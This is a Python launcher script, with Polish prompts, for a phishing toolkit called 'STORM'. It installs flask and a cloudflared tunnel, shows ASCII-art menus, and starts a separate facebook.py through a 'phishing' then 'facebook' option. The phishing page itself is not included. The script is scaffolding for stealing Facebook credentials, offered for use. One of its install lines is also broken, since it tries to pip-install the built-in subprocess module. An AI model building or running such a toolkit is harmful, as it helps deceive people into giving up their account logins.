import os
import subprocess
import time

print("pierwsze uruchomienie?? tak/nie")
first = input()

if first == "tak":
    print("pobieram potrzebne rzeczy")
    time.sleep(1)
    os.system("pip install flask")
    os.system("pip install subprocess")
    OS = input("jestes na linuxie czy windowsie linux/windows?")
    if OS == "linux":
        os.system("curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared")
    elif OS == "windows":
        os.system("winget install --id Cloudflare.cloudflared")

if os.name == "posix":
    subprocess.run(["clear"])
elif os.name == "nt":
    os.system("cls")

print("███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗")
print("██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║")
print("███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║")
print("╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║")
print("███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║")
print("╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝")
print("                                  version 1.2")
print("")
print("")
print("")
print("    [1] phishing")
print("")
print("    [2] coming soon")
print("")
print("")


while True:
    option = input("    choose an option: ")
    if option == "1":
        if os.name == "posix":
            os.system("clear")
        elif os.name == "nt":
            os.system("cls")

        print("███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗      ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ ")
        print("██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║      ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗")
        print("███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║      ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝")
        print("╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║      ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗")
        print("███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║      ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║")
        print("╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝      ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝")
        print("                                                                                           version 1.0")
        print("")
        print("")
        print("    [1] facebook")
        print("")
        print("")
        print("")

        phishing_option = input("    choose an option: ")
        if phishing_option == "1":
            subprocess.run(["python", "facebook.py"])


        break

    elif option == "2":
        print("")
        print("")
        print("    [+] coming soon")
        print("")
        print("")
        print("")


